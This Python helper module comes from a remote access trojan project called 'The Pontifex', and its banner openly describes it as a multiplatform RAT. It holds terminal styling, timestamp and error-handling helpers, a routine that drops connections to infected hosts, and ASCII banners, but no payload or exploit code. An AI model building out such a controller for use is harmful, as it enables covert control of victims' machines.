import sys, os, traceback, readline
from datetime import datetime
from termcolor import colored
from lib.debug import Debug
from prompt_toolkit.styles import Style

#__all__ = []

prompt_style = Style.from_dict({
    'completion-menu.completion': 'bg:#008888 #ffffff',
    'completion-menu.completion.current': 'bg:#00aaaa #000000',
    'scrollbar.background': 'bg:#88aaaa',
    'scrollbar.button': 'bg:#222222',
    'prompt': '#00FFFF bold',
    'prompt.arg.text': '#00aaaa',
})

SUCCESS_CODE    = "SUCCESS"
ERROR_CODE      = "ERROR"
WINDOWS         = sys.platform.startswith('win')
CMD_CLEAR       = "cls" if WINDOWS else "clear"

def ctime(file=False):
    dtCurrentTime = datetime.now()
    if file == False:
        return colored(dtCurrentTime.strftime("%Y/%m/%d %H:%M:%S"), 'yellow')
    else:
        return colored(dtCurrentTime.strftime("%Y-%m-%d at %H.%M.%S"), 'yellow')

def clean(s):
    s.close()

def prompt_input(*objs, commands):
    pass

def safe_exec(func):
    def inner_function(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception as e:
            Debug.eprint(f"<{func.__name__}> {e}")
            traceback.print_exc()
    return inner_function

def terminate(dmoss, dmos, signal=None):
    dmos.conn.close()
    dmoss.pop(dmos.md5_hash, None)
    signals = ["gracefully", "error"]
    if signal == signals[0]:
        Debug.tprint("Connection with dmos {} terminated by the Pontifex".format(dmos.md5_hash))
    elif signal == signals[1]:
        Debug.tprint("Connection with dmos {} has been broken".format(dmos.md5_hash), thread=True)

def banner():
    print(r"""
 _______ _           ______                 _    ___
(_______) |         (_____ \            _  (_)  / __)
    _   | |__  _____ _____) )__  ____ _| |_ _ _| |__ _____ _   _
   | |  |  _ \| ___ |  ____/ _ \|  _ (_   _) (_   __) ___ ( \ / )
   | |  | | | | ____| |   | |_| | | | || |_| | | |  | ____|) X (
   |_|  |_| |_|_____)_|    \___/|_| |_| \__)_| |_|  |_____|_/ \_) {}v1.0 

             λ Multiplatform RAT created by {}@kryptosr {}λ
    
    """.format("\033[1m", "\033[31m", "\033[37m"))

def banner_old():
    
    print(r"""
                _|_             Welcome to the Cathedral
                 |          [   {2}The Pontifex version 0.1.3{1}                                                                ]
                / \    *    [   {0}Disclaimer{1}: this project has no religious intent, if you know the reference, you know ;)  ]
                | |         [   {0}Creator{1}: Kryptosr                                                                         ]
        *      //_\\        [   {0}Hobby{1}: Making secc width doritos                                                          ]
              //(_)\\
               |/^\|      *
            *  ||_||
    *          // \\
              //   \\         *
             // === \\  *
        *   // =-=-= \\
           //   ===   \\   *
    *     //|         |\\
            |         |
            |  __ __  |   *
        *   | |  |  | |
            | | -|- | |        *
            |_|__|__|_|
*          /`  =======`\
        /`    =======    `\
                """.format('\033[31m', '\033[00m', '\033[93m'))
    